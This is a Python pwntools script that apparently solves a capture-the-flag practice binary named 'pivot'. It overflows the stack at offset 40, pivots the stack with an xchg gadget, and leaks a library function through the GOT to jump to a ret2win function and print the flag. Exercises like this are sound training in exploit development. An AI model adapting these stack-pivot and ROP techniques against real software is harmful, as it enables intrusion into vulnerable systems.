import time

from pwn import *


EXECUTABLE = "./pivot"
context.binary = elf = ELF(EXECUTABLE)
lib_pivot = ELF("./libpivot.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", b"AAAA")
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()


rop = ROP(elf)

p.recvuntil(b"to pivot: ")
pivot_point = int(p.recvline(keepends=False), 16)
log.debug(f"Pivot point: {hex(pivot_point)}")

# Create rop for pivoting
pivot = ROP(elf)
pivot(rax=pivot_point)
pivot.raw(elf.symbols.usefulGadgets + 0x02) # xchg rsp, rax; ret;


# Create rop to call ret2win
ret2win_offset = 0xa81 - 0x96a

# First make sure the foothold function is called
rop.call(elf.plt.foothold_function)
# Follow the pointer
rop(rax=elf.got.foothold_function)
rop.raw(elf.symbols.usefulGadgets + 0x05) # mov rax, qword [rax]; ret;

# Add ret2win offset to rax
rop(rbp=ret2win_offset)
rop.raw(elf.symbols.usefulGadgets + 0x09) # add rax, rbp; ret;

# jmp to rax (thus to ret2win)
rop.raw(0x4007c1) # jmp rax;


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", rop.chain())

log.debug("Sending pivot chain:\n" + pivot.dump())
p.sendafter(b"> ", flat({ OFFSET: pivot.chain() }))

p.recvline() # Thank you
p.recvline() # Foothold function call

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
